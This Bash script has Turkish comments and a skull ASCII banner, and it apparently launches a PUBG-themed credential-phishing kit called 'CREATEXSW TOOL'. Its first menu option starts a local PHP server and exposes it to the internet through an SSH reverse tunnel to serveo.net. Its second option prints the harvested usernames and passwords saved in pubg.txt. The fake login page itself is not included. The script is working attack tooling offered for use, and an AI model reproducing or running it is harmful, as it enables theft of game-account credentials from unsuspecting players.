#!/bin/bash

# Renkler
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Özel ASCII Art
ascii_art="
___________________¶¶¶¶¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5
"

# Menü fonksiyonu
function show_menu {
    clear
    echo -e "${GREEN}$ascii_art${NC}"
    echo -e "${GREEN}               CREATEXSW TOOL               ${NC}"
    echo -e "${GREEN}    1) Serveo ile Siteyi Başlat${NC}"
    echo -e "${RED}             2) Girilen Kullanıcı Adlarını ve Şifreleri Göster${NC}"
    echo -e "${GREEN}         00) Menüye Dön${NC}"
}

# Giriş ekranı
show_menu

# Ana döngü
while true; do
    echo -n "Seçim yapınız (1, 2 ya da 00): "
    read secim

    if [[ "$secim" == "1" || "$secim" == "01" ]]; then
        echo -e "${GREEN}Serveo ile site başlatılıyor...${NC}"
        
        # Kullanıcıdan 4 haneli port girmesini iste
        echo -e "${GREEN}Örnek port: 8080${NC}"
        echo -n "Lütfen 4 haneli bir port numarası girin: "
        read port

        # Portu kontrol et, 4 haneli mi?
        if [[ ${#port} -eq 4 && "$port" =~ ^[0-9]+$ ]]; then
            # PHP sunucusunu arka planda başlat
            php -S localhost:$port &

            # Serveo tünelini başlat
            ssh -R 80:localhost:$port serveo.net &
            serveo_pid=$!

            echo -e "${GREEN}Sunucu ${GREEN}localhost:$port${NC} adresinde başlatıldı."
            echo -e "${GREEN}Serveo tüneli ${GREEN}http://serveo.net${NC} üzerinden erişilebilir."
            echo -e "${RED}Durdurmak için Ctrl+C yapın.${NC}"

            # Süreç devam etsin
            wait $serveo_pid
        else
            echo -e "${RED}Geçersiz port numarası!${NC}"
        fi

    elif [[ "$secim" == "2" || "$secim" == "02" ]]; then
        echo -e "${RED}Girilen kullanıcı adı ve şifreler:${NC}"
        
        # pubg.txt dosyasındaki verileri oku ve göster
        if [[ -f pubg.txt ]]; then
            while IFS= read -r line; do
                echo -e "${GREEN}$line${NC}"
            done < pubg.txt
        else
            echo -e "${RED}pubg.txt dosyası bulunamadı!${NC}"
        fi

        echo -e "${GREEN}Devam etmek için '00' yazarak menüye dönün.${NC}"
        read input
        if [[ "$input" == "00" ]]; then
            show_menu  # Menüye dön
        fi

    elif [[ "$secim" == "00" ]]; then
        show_menu  # Menüye geri dön

    else
        echo -e "${RED}Geçersiz seçim!${NC}"
    fi
done

# İmza
echo -e "${GREEN}**** Created by CREATEX ****${NC}"

